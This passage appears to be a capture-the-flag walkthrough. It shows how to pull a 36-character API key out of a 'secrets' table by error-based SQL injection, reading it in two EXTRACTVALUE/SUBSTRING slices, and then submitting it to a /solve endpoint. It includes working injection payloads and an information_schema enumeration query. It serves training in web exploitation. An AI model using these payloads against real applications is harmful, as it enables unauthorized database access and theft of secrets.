You will have noticed that `EXTRACTVALUE` only shows you the first **32
characters** of its error string. With the leading `:` delimiter that leaves 31
characters of your actual value — but `secrets.api_key` is a 36-character UUID
(`8-4-4-4-12` hex with dashes). So a single request can never show the whole
thing.

The fix is to read it in slices with `SUBSTRING(str, start, length)` and stitch
them back together yourself. Two requests are enough:

```
-- chunk 1: characters 1..31 (fills the 32-char window with the ':' prefix)
alice' AND extractvalue(1,concat(0x3a,(select substring(api_key,1,31) from secrets limit 1)))-- -

-- chunk 2: characters 32 onward (the last 5 characters of the UUID)
alice' AND extractvalue(1,concat(0x3a,(select substring(api_key,32) from secrets limit 1)))-- -
```

Each banner shows `XPATH syntax error: ':<chunk>'`. Strip the leading `:` from
each chunk, concatenate `chunk1 + chunk2`, and you have the full UUID.

Then trade it for the flag. `/solve` wants a **POST with a JSON body**:

```
POST /solve
Content-Type: application/json

{"key": "<the reassembled uuid>"}
```

A correct key returns the flag; a wrong one returns 403. The key is random per
instance, so use the one _your_ container leaked. (Didn't want to assume the table
or column name? Swap the subquery for
`select concat(table_name,0x2e,column_name) from information_schema.columns where table_schema=database() limit 1 offset N`
and walk the offsets — the same EXTRACTVALUE technique, no guessing.)
